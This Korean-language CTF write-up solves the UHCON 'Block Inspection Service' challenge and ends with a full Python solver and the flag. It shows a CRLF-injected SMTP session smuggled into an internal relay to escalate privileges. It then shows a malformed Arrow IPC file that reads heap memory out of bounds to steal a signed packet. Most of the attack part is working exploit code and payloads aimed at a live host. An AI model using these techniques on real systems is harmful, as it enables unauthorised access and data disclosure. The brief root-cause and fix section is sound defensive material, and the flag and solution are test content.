# UHCON — Block Inspection Service 풀이

## 결과

- 최종 플래그: `FLAG{param_y4rd_0v3rturn_th3_ncr_v1a_smuggl3_cha1n}`
- CTFd 문제 ID: `8`
- CTFd 검증: `solved_by_me: true`
- 핵심 체인: 내부 릴레이 프로토콜 스머글링 → `reviewer_assist` 획득 → 정상 PASS 워크북으로 서명 패킷 발급 → Arrow 고정폭 배열 OOB 읽기 → 패킷 회수·제출

## 1. 공격 표면

새 계정에서 검사를 시작한 뒤 즉시 종료하면 결과는 `FAIL`이 된다. 이 검사에 재검사 요청을 만들면 `queued` 상태의 `review_id`를 얻는다.

QA 경로는 처음에는 다음 오류로 막혀 있다.

```json
{"error":"reviewer_assist_required"}
```

연동 안내와 실제 요청을 대조하면 `/captures/import`가 `capture_metadata_url`, `import_channel`을 받아 내부 `gauge-relay:2525`와 통신한다. `import_channel`에 CRLF를 넣을 수 있어, 채널 이름 뒤에 SMTP 형태의 전체 세션을 붙일 수 있었다.

## 2. `reviewer_assist` 권한 획득

재검사에 묶을 이벤트 JSON은 다음과 같다.

```json
{
  "timeline": [{"decision": "routine"}],
  "review": {"timeline": [{"decision": "escalate"}]},
  "permissions": [{"grant": "viewer"}],
  "pack": {"permissions": [{"grant": "assessor"}]}
}
```

이를 Base64url로 인코딩해 `X-Yard-Ops-Event` 레코드에 넣고, `import_channel` 뒤에 SMTP 세션을 이어 붙인다.

```text
coatmetrics-v2\r\n
EHLO coatmetrics-provider\r\n
MAIL FROM:<provider@coatmetrics.local>\r\n
RCPT TO:<gauge-relay@gauge-relay.local>\r\n
DATA\r\n
X-Yard-Ops-Event: import=<KEY>;review=<REVIEW_ID>;eventState=pending;eventKind=coating-defect;eventTag=escalate;autoApprove=false;event=<BASE64URL_JSON>\r\n
.\r\n
QUIT\r\n
```

요청의 핵심 필드는 아래와 같다. 외부 서버나 세션 쿠키 반출은 필요하지 않다.

```json
{
  "review_id": "review_...",
  "import_key": "assist...",
  "capture_metadata_url": "http://gauge-relay:2525/",
  "import_channel": "coatmetrics-v2\r\n<SMTP SESSION>",
  "headers": {}
}
```

처리가 끝나면 재검사 목록에 `/rechecks/<REVIEW_ID>/redeem` 링크가 생긴다. 이 경로를 POST하면 다음 응답과 함께 QA 작업공간이 열린다.

```json
{"ok":true,"role":"reviewer_assist"}
```

## 3. 정상 PASS 판정 패킷 발급

`POST /qa/workbooks/preview`는 Arrow IPC 또는 Feather 파일을 받고, 처리할 때 봉인 판정 패킷 한 건을 대기열에 넣는다. 먼저 다음 스키마로 2,048개의 정상 PASS 행을 올린다.

| 열 | 타입 | 값 |
| --- | --- | --- |
| `inspection_id` | non-null string | 현재 계정의 검사 ID |
| `outcome` | non-null string | `PASS` |
| `measured_avg` | non-null float64 | `100.0` |
| `spec_min` | non-null float64 | `1.0` |

서버 응답은 `declared_rows=2048`, `rows_returned=2048`이며, 이 시점에 자기 계정·검사·재검사에 귀속된 유효한 PASS 패킷이 발급된다. UI에는 패킷 본문이 표시되지 않고 대기열 개수만 보인다.

## 4. Arrow 고정폭 배열 OOB 읽기

QA 설명에는 “컨테이너 헤더가 선언한 행 수를 그대로 쓰고 파일 길이로 다시 계산하지 않으며 최대 2,048행을 돌려준다”는 문구가 있었다. 이 동작을 그대로 이용한다.

1. `fixed_size_binary(64)` 타입의 `measurement` 열과 실제 행 한 개(`A` 64바이트)를 가진 Arrow IPC 파일을 만든다.
2. RecordBatch FlatBuffer의 `RecordBatch.length`를 `1`에서 `2048`로 바꾼다.
3. 같은 배치의 `FieldNode.length`도 `1`에서 `2048`로 바꾼다.
4. 물리 데이터 버퍼 길이는 64바이트 그대로 둔다.

현재 PyArrow가 만든 538바이트 파일에서는 두 필드가 각각 파일 오프셋 `216`, `272`에 있었다. 최종 솔버는 이 값을 하드코딩하지 않고 FlatBuffer 구조를 따라가 동적으로 찾는다.

```text
logical rows       = 2048
physical rows      = 1
bytes per row      = 64
physical buffer    = 64 bytes
server return size = 2048 × 64 = 131072 bytes
```

Arrow reader는 파일을 열 때 이 불일치를 거부하지 않았고, 서버는 배열을 곧바로 JSON 행으로 변환했다. `fixed_size_binary` 값은 응답에서 Base64 문자열이므로 각 행을 디코딩해 이어 붙이면 워커 프로세스의 인접 힙 메모리 128 KiB를 복원할 수 있다.

가변 길이 문자열 타입은 별도의 오프셋 벡터도 필요해 프로세스 오류만 일으켰다. 반면 고정폭 타입은 시작 주소에서 `행 수 × 폭`만큼 직선으로 읽기 때문에 안정적으로 OOB 데이터를 반환했다.

## 5. 서명 패킷 추출과 제출

누출된 메모리에는 다음 형식의 봉인 패킷이 그대로 남아 있었다.

```text
base64url(JSON).<64자리 hex 서명>
```

디코딩한 JSON의 주요 필드는 다음과 같다.

```json
{
  "certificate_id": "pkt_...",
  "inspection_id": "match_...",
  "review_id": "review_...",
  "kind": "conformance_decision_packet",
  "outcome": "PASS",
  "measured_avg": 100,
  "spec_min": 1,
  "player_id": "usr_...",
  "tenant_id": "tenant_..."
}
```

다른 사용자 패킷도 같은 힙에서 보일 수 있으므로 다음 조건을 모두 확인해야 한다.

- `inspection_id`가 현재 계정의 검사와 같음
- `review_id`가 현재 계정의 재검사와 같음
- `kind == "conformance_decision_packet"`
- `outcome == "PASS"`

대기열 한도는 4개다. 최종 솔버는 정상 PASS 워크북 한 건 뒤에 128 KiB 고정폭 정상 배치 한 건으로 힙을 매핑하고, 남은 두 자리에서 OOB 요청을 최대 두 번 보낸다. 회수한 전체 토큰을 다음과 같이 제출한다.

```http
POST /qa/decision-packets/submit
Content-Type: application/json

{"packet":"<RECOVERED_SIGNED_PACKET>"}
```

새 계정에서는 원장에 PASS가 반영된다. 이미 같은 패킷이 반영된 상태에서 재전송하면 HTTP 409와 `record_state: "unchanged"`가 올 수 있지만, 대시보드와 QA 작업공간에는 정산 완료 상태와 플래그가 렌더링된다.

## 6. 자동 솔버

요구 패키지:

```bash
python -m pip install requests pyarrow
```

실행:

```bash
python solve.py --base http://43.203.187.40:8080
```

표준 진입점인 `solve.py`는 같은 폴더의 실제 구현 `solver.py`를 호출해 다음을 순서대로 자동화한다.

1. 임시 계정 생성
2. FAIL 검사와 재검사 생성
3. 내부 릴레이에 이벤트 프로토콜 스머글링
4. `reviewer_assist` 수령
5. 2,048행 정상 PASS 워크북 업로드
6. 정상 고정폭 배치로 128 KiB 힙 영역 매핑
7. 1행 `fixed_size_binary(64)` 파일의 논리 행 수를 2,048로 변조
8. Base64 응답 128 KiB 복원
9. 자기 검사에 귀속된 서명 PASS 패킷 선택
10. 패킷 제출 후 페이지에서 플래그 추출

오프라인 검증 결과는 다음과 같다.

```text
PASS workbook: 2048 rows
malformed IPC: 538 bytes
logical OOB rows: 2048
decoded response memory: 131072 bytes
patched FlatBuffer offsets: 216, 272
```

## 7. 근본 원인과 수정 방향

취약점은 두 경계가 연쇄적으로 무너져 발생했다.

1. `import_channel`의 개행을 차단하지 않아 신뢰된 내부 릴레이 프로토콜에 임의 레코드를 주입할 수 있었다.
2. Arrow IPC 메타데이터의 논리 길이를 신뢰하고, 물리 버퍼 크기와의 정합성을 검사하지 않은 채 행을 직렬화했다.

수정 시에는 `import_channel`을 고정된 열거형으로 검증하고 CR/LF를 거부해야 한다. Arrow 파일은 처리 전에 레코드 배치와 모든 배열을 완전 검증하고, 각 고정폭 버퍼가 최소 `length × byte_width` 바이트인지 확인해야 한다. 파싱 워커에는 서명 키나 다른 요청의 판정 패킷을 같은 힙에 두지 않는 격리도 필요하다.

## 8. 확인 근거

- `bis_child_fixed_width_overread_result.json`: 128 KiB OOB 응답과 서명 패킷 흔적
- `bis_root_oob_hunt_result.json`: 반복 누출 중 복원한 완전한 PASS 패킷
- `bis_child_redeem_leaked_packet_result.json`: 검사 PASS 상태 및 플래그가 렌더링된 페이지
- `bis_ctfd_submit_result.json`: CTFd의 `solved_by_me: true` 확인
- `arrow_uint8_leak_probe_result.json`: 1바이트 물리 버퍼에서 2,048바이트를 읽는 최소 로컬 재현

최종 플래그:

```text
FLAG{param_y4rd_0v3rturn_th3_ncr_v1a_smuggl3_cha1n}
```


## 9. 최종 풀이 코드 전체

표준 진입점과 실제 구현을 모두 싣는다. 계정·세션·토큰은 하드코딩하지 않으며 실행 중 새 임시 계정을 만든다.

### `solve.py`

````python
#!/usr/bin/env python3
"""Compatibility entry point for the final Block Inspection Service solver."""

from solver import main


if __name__ == "__main__":
    raise SystemExit(main())
````

### `solver.py`

````python
#!/usr/bin/env python3
"""End-to-end solver for UHCON Block Inspection Service.

The solver creates a disposable portal account, acquires reviewer-assist,
uses an Arrow fixed-width over-read to recover its signed decision packet,
submits the packet, and prints the flag.
"""

from __future__ import annotations

import argparse
import base64
import json
import re
import secrets
import struct
import sys
import time
from dataclasses import dataclass

import pyarrow as pa
import pyarrow.ipc as ipc
import requests


DEFAULT_BASE = "http://43.203.187.40:8080"
LEAK_ROWS = 2048
FLAG_RE = re.compile(r"(?:FLAG|UHCON|CTF)\{[^}\r\n]{1,300}\}", re.I)
PACKET_RE = re.compile(rb"(?<![A-Za-z0-9_-])([A-Za-z0-9_-]{100,})\.([0-9a-f]{64})(?![0-9a-f])")


@dataclass
class Principal:
    username: str
    password: str
    inspection_id: str
    review_id: str


def require(response: requests.Response, label: str) -> requests.Response:
    if response.status_code >= 400:
        raise RuntimeError(
            f"{label}: HTTP {response.status_code}: {response.text[:1000]}"
        )
    return response


def b64url_encode_json(value: object) -> str:
    raw = json.dumps(value, separators=(",", ":")).encode()
    return base64.urlsafe_b64encode(raw).decode().rstrip("=")


def b64url_decode(value: str) -> bytes:
    return base64.urlsafe_b64decode(value + "=" * (-len(value) % 4))


def register(base: str, session: requests.Session) -> tuple[str, str]:
    # Keep all three unique identity fields well below the portal's length cap.
    nonce = f"{int(time.time())}{secrets.token_hex(3)}"
    username = "aleak" + nonce
    password = "BIS_" + secrets.token_hex(16)
    response = require(
        session.post(
            base + "/register",
            data={
                "username": username,
                "password": password,
                "display_name": "Arrow packet recovery",
                "handle": username,
                "vendor_name": "Arrow packet recovery",
            },
            timeout=20,
        ),
        "register",
    )
    if "/login" in response.url:
        response = require(
            session.post(
                base + "/login",
                data={"username": username, "password": password},
                timeout=20,
            ),
            "login",
        )
        if "/login" in response.url:
            raise RuntimeError("login did not create an authenticated session")
    print(f"[+] account: {username}", flush=True)
    return username, password


def create_failed_inspection(base: str, session: requests.Session) -> str:
    started = require(
        session.post(
            base + "/inspections",
            json={},
            headers={"Accept": "application/json"},
            timeout=20,
        ),
        "start inspection",
    ).json()
    inspection_id = started["inspection"]["id"]
    finished = require(
        session.post(
            base + f"/inspections/{inspection_id}/finish",
            json={},
            headers={"Accept": "application/json"},
            timeout=20,
        ),
        "finish inspection",
    ).json()
    outcome = (finished.get("inspection", {}).get("result") or {}).get("outcome")
    if outcome != "FAIL":
        raise RuntimeError(f"expected a fresh FAIL inspection, got {outcome!r}")
    print(f"[+] failed inspection: {inspection_id}", flush=True)
    return inspection_id


def gain_reviewer_assist(
    base: str, session: requests.Session, inspection_id: str
) -> str:
    nonce = secrets.token_hex(8)
    review = require(
        session.post(
            base + "/rechecks",
            data={
                "inspection_id": inspection_id,
                "title": "Reviewer assist " + nonce,
                "evidence_html": "<section>Controlled review package.</section>",
                "renderer": "timeline",
                "variant": "scoreboard",
            },
            headers={"Accept": "application/json"},
            timeout=20,
        ),
        "create recheck",
    ).json()
    review_id = review["id"]
    if review.get("status") != "queued":
        raise RuntimeError(f"new recheck is not queued: {review!r}")

    # This is the exact document shape that places the review in
    # assist_granted. Redeeming it turns on the QA reviewer-assist seat.
    event = {
        "timeline": [{"decision": "routine"}],
        "review": {"timeline": [{"decision": "escalate"}]},
        "permissions": [{"grant": "viewer"}],
        "pack": {"permissions": [{"grant": "assessor"}]},
    }
    import_key = "assist" + nonce
    record = (
        f"X-Yard-Ops-Event: import={import_key};review={review_id};"
        "eventState=pending;eventKind=coating-defect;eventTag=escalate;"
        "autoApprove=false;event=" + b64url_encode_json(event)
    )
    smtp = "\r\n".join(
        (
            "EHLO coatmetrics-provider",
            "MAIL FROM:<provider@coatmetrics.local>",
            "RCPT TO:<gauge-relay@gauge-relay.local>",
            "DATA",
            record,
            ".",
            "QUIT",
            "",
        )
    )
    imported = require(
        session.post(
            base + "/captures/import",
            json={
                "review_id": review_id,
                "import_key": import_key,
                "capture_metadata_url": "http://gauge-relay:2525/",
                "import_channel": "coatmetrics-v2\r\n" + smtp,
                "headers": {},
            },
            headers={"Accept": "application/json"},
            timeout=30,
        ),
        "relay import",
    ).json()
    print(f"[+] relay accepted: {json.dumps(imported, separators=(',', ':'))}", flush=True)

    redeem_path = f"/rechecks/{review_id}/redeem"
    for _ in range(80):
        page = require(session.get(base + "/rechecks", timeout=20), "list rechecks").text
        if redeem_path in page:
            break
        time.sleep(0.25)
    else:
        raise RuntimeError("assist_granted redeem link did not appear")

    redeemed = require(
        session.post(
            base + redeem_path,
            headers={"Accept": "application/json"},
            timeout=20,
        ),
        "redeem reviewer assist",
    )
    print(f"[+] reviewer assist redeemed: {redeemed.text[:500]}", flush=True)
    return review_id


def align8(value: int) -> int:
    return (value + 7) & ~7


def make_pass_arrow(inspection_id: str) -> bytes:
    """Build the known-good workbook that causes one signed PASS packet."""
    count = LEAK_ROWS
    schema = pa.schema(
        [
            pa.field("inspection_id", pa.string(), nullable=False),
            pa.field("outcome", pa.string(), nullable=False),
            pa.field("measured_avg", pa.float64(), nullable=False),
            pa.field("spec_min", pa.float64(), nullable=False),
        ]
    )
    batch = pa.record_batch(
        [
            pa.array([inspection_id] * count, type=pa.string()),
            pa.array(["PASS"] * count, type=pa.string()),
            pa.array([100.0] * count, type=pa.float64()),
            pa.array([1.0] * count, type=pa.float64()),
        ],
        schema=schema,
    )
    sink = pa.BufferOutputStream()
    with ipc.new_file(sink, schema) as writer:
        writer.write_batch(batch)
    return sink.getvalue().to_pybytes()


def prime_pass_packet(base: str, session: requests.Session, inspection_id: str) -> dict:
    """Queue a valid, account-bound PASS packet before reading stale heap data."""
    workbook = make_pass_arrow(inspection_id)
    response = require(
        session.post(
            base + "/qa/workbooks/preview",
            data=workbook,
            headers={"Content-Type": "application/octet-stream", "Accept": "application/json"},
            timeout=50,
        ),
        "prime PASS workbook",
    ).json()
    if response.get("declared_rows") != LEAK_ROWS or response.get("rows_returned") != LEAK_ROWS:
        raise RuntimeError(f"PASS workbook was not fully accepted: {response!r}")
    summary = {key: value for key, value in response.items() if key != "rows"}
    print(f"[+] PASS packet primed: {json.dumps(summary, separators=(',', ':'))}", flush=True)
    return summary


def u16(data: bytes | bytearray, offset: int) -> int:
    return struct.unpack_from("<H", data, offset)[0]


def u32(data: bytes | bytearray, offset: int) -> int:
    return struct.unpack_from("<I", data, offset)[0]


def i32(data: bytes | bytearray, offset: int) -> int:
    return struct.unpack_from("<i", data, offset)[0]


def i64(data: bytes | bytearray, offset: int) -> int:
    return struct.unpack_from("<q", data, offset)[0]


def flatbuffer_fields(data: bytes | bytearray, table: int) -> list[int]:
    vtable = table - i32(data, table)
    count = (u16(data, vtable) - 4) // 2
    return [u16(data, vtable + 4 + index * 2) for index in range(count)]


def message_body_length(metadata: bytes | bytearray) -> int:
    root = u32(metadata, 0)
    message_fields = flatbuffer_fields(metadata, root)
    if len(message_fields) <= 3 or message_fields[3] == 0:
        return 0
    return i64(metadata, root + message_fields[3])


def make_overread_arrow() -> tuple[bytes, dict[str, int]]:
    """Build one binary(64) row, then claim that 2048 rows exist."""
    arrow_type = pa.binary(64)
    schema = pa.schema([pa.field("measurement", arrow_type, nullable=False)])
    batch = pa.record_batch([pa.array([b"A" * 64], type=arrow_type)], schema=schema)
    sink = pa.BufferOutputStream()
    with ipc.new_file(sink, schema) as writer:
        writer.write_batch(batch)
    payload = bytearray(sink.getvalue().to_pybytes())

    cursor = 8
    messages: list[tuple[int, int, int]] = []
    while cursor + 8 <= len(payload) - 10:
        if u32(payload, cursor) != 0xFFFFFFFF:
            break
        metadata_length = u32(payload, cursor + 4)
        if metadata_length == 0:
            break
        metadata_start = cursor + 8
        metadata = payload[metadata_start : metadata_start + metadata_length]
        body_length = message_body_length(metadata)
        messages.append((metadata_start, metadata_length, body_length))
        cursor = metadata_start + align8(metadata_length) + align8(body_length)
    if len(messages) != 2:
        raise RuntimeError(f"unexpected Arrow message layout: {messages!r}")

    metadata_start, metadata_length, body_length = messages[1]
    metadata = payload[metadata_start : metadata_start + metadata_length]
    root = u32(metadata, 0)
    message_fields = flatbuffer_fields(metadata, root)
    header_field = root + message_fields[2]
    record_batch = header_field + u32(metadata, header_field)
    record_fields = flatbuffer_fields(metadata, record_batch)

    row_count_offset = metadata_start + record_batch + record_fields[0]
    nodes_field = record_batch + record_fields[1]
    nodes_vector = nodes_field + u32(metadata, nodes_field)
    node_length_offset = metadata_start + nodes_vector + 4
    if i64(payload, row_count_offset) != 1 or i64(payload, node_length_offset) != 1:
        raise RuntimeError("Arrow layout checks failed before mutation")
    struct.pack_into("<q", payload, row_count_offset, LEAK_ROWS)
    struct.pack_into("<q", payload, node_length_offset, LEAK_ROWS)

    return bytes(payload), {
        "file_bytes": len(payload),
        "metadata_start": metadata_start,
        "metadata_length": metadata_length,
        "body_length": body_length,
        "row_count_offset": row_count_offset,
        "node_length_offset": node_length_offset,
    }


def make_heap_groom_arrow() -> bytes:
    """Leave a mapped 128 KiB fixed-width value buffer in the parser heap."""
    arrow_type = pa.binary(64)
    schema = pa.schema([pa.field("measurement", arrow_type, nullable=False)])
    batch = pa.record_batch(
        [pa.array([b"G" * 64] * LEAK_ROWS, type=arrow_type)], schema=schema
    )
    sink = pa.BufferOutputStream()
    with ipc.new_file(sink, schema) as writer:
        writer.write_batch(batch)
    return sink.getvalue().to_pybytes()


def decode_leak(response_json: dict) -> bytes:
    rows = response_json.get("rows")
    if not isinstance(rows, list) or len(rows) != LEAK_ROWS:
        raise RuntimeError(f"expected {LEAK_ROWS} leaked rows, got {type(rows).__name__}")
    chunks: list[bytes] = []
    for row in rows:
        if not isinstance(row, list) or not row or not isinstance(row[0], str):
            raise RuntimeError("unexpected fixed-width binary JSON representation")
        chunks.append(b64url_decode(row[0]))
    return b"".join(chunks)


def bound_packets(raw: bytes, inspection_id: str, review_id: str) -> list[tuple[int, str, dict]]:
    found: list[tuple[int, str, dict]] = []
    seen: set[str] = set()
    for match in PACKET_RE.finditer(raw):
        token = match.group(0).decode()
        if token in seen:
            continue
        seen.add(token)
        try:
            document = json.loads(b64url_decode(match.group(1).decode()))
        except (ValueError, UnicodeDecodeError, json.JSONDecodeError):
            continue
        if (
            document.get("inspection_id") == inspection_id
            and document.get("review_id") == review_id
            and document.get("kind") == "conformance_decision_packet"
            and document.get("outcome") == "PASS"
        ):
            found.append((match.start(), token, document))
    return found


def recover_packet(
    base: str, session: requests.Session, inspection_id: str, review_id: str
) -> tuple[str, dict, dict]:
    payload, layout = make_overread_arrow()
    groom_payload = make_heap_groom_arrow()
    print(f"[+] malformed Arrow layout: {json.dumps(layout, separators=(',', ':'))}", flush=True)

    # One valid fixed-width batch maps a 128 KiB arena before the malformed
    # read.  It consumes a queue slot, so groom only once: after the PASS
    # workbook there is room for this allocation and at most two leak reads.
    groom = require(
        session.post(
            base + "/qa/workbooks/preview",
            data=groom_payload,
            headers={
                "Content-Type": "application/octet-stream",
                "Accept": "application/json",
            },
            timeout=50,
        ),
        "heap groom workbook",
    )
    print(f"[+] heap groom accepted: HTTP {groom.status_code}", flush=True)

    for attempt in range(1, 3):
        response = session.post(
            base + "/qa/workbooks/preview",
            data=payload,
            headers={
                "Content-Type": "application/octet-stream",
                "Accept": "application/json",
            },
            timeout=50,
        )
        if response.status_code >= 400:
            print(
                f"[-] workbook leak attempt {attempt}: HTTP {response.status_code}: "
                f"{response.text[:200]}",
                flush=True,
            )
            time.sleep(0.25)
            continue
        parsed = response.json()
        raw = decode_leak(parsed)
        candidates = bound_packets(raw, inspection_id, review_id)
        print(
            f"[+] leak attempt {attempt}: {len(raw)} bytes, "
            f"{len(PACKET_RE.findall(raw))} signed-looking values, "
            f"{len(candidates)} bound packet(s)",
            flush=True,
        )
        if candidates:
            offset, token, document = max(
                candidates, key=lambda item: int(item[2].get("issued_at", 0))
            )
            print(f"[+] selected packet at leak offset 0x{offset:x}: {json.dumps(document)}", flush=True)
            return token, document, layout
        time.sleep(0.25)
    raise RuntimeError("the four-entry queue filled without leaking the primed PASS packet")


def submit_and_get_flag(
    base: str, session: requests.Session, packet: str
) -> tuple[dict, list[str]]:
    response = session.post(
        base + "/qa/decision-packets/submit",
        json={"packet": packet},
        headers={"Accept": "application/json"},
        timeout=30,
    )
    try:
        submitted = response.json()
    except ValueError as error:
        raise RuntimeError(f"packet submit returned non-JSON HTTP {response.status_code}") from error
    if response.status_code not in {200, 409}:
        raise RuntimeError(f"packet submit: HTTP {response.status_code}: {submitted!r}")
    if submitted.get("record_state") not in {"decision_packet_recorded", "unchanged"}:
        raise RuntimeError(f"unexpected submit result: {submitted!r}")
    print(f"[+] packet submitted: {json.dumps(submitted, separators=(',', ':'))}", flush=True)

    flags: set[str] = set()
    for _ in range(20):
        for path in ("/dashboard", "/qa/workspace", "/conformance"):
            page = require(session.get(base + path, timeout=20), path).text
            flags.update(FLAG_RE.findall(page))
        if flags:
            break
        time.sleep(0.25)
    return submitted, sorted(flags)


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--base", default=DEFAULT_BASE)
    parser.add_argument("--timeout", type=float, default=20.0)
    args = parser.parse_args()
    base = args.base.rstrip("/")

    session = requests.Session()
    session.headers["User-Agent"] = "UHCON-BIS-solver/1.0"
    try:
        username, password = register(base, session)
        inspection_id = create_failed_inspection(base, session)
        review_id = gain_reviewer_assist(base, session, inspection_id)
        principal = Principal(username, password, inspection_id, review_id)
        print(
            f"[+] principal: {json.dumps({'username': username, 'inspection_id': inspection_id, 'review_id': review_id})}",
            flush=True,
        )

        pass_preview = prime_pass_packet(base, session, inspection_id)
        packet, packet_document, layout = recover_packet(
            base, session, inspection_id, review_id
        )
        submitted, flags = submit_and_get_flag(base, session, packet)
        result = {
            "account": {
                "username": principal.username,
                "inspection_id": principal.inspection_id,
                "review_id": principal.review_id,
            },
            "pass_preview": pass_preview,
            "arrow_layout": layout,
            "packet_document": packet_document,
            "submit": submitted,
            "flags": flags,
        }
        print(json.dumps(result, ensure_ascii=False, indent=2), flush=True)
        if not flags:
            print("[-] packet recorded but no flag was rendered", file=sys.stderr)
            return 2
        for flag in flags:
            print(f"FLAG: {flag}")
        return 0
    except (requests.RequestException, KeyError, RuntimeError, ValueError) as error:
        print(f"[-] {type(error).__name__}: {error}", file=sys.stderr)
        return 1


if __name__ == "__main__":
    raise SystemExit(main())
````
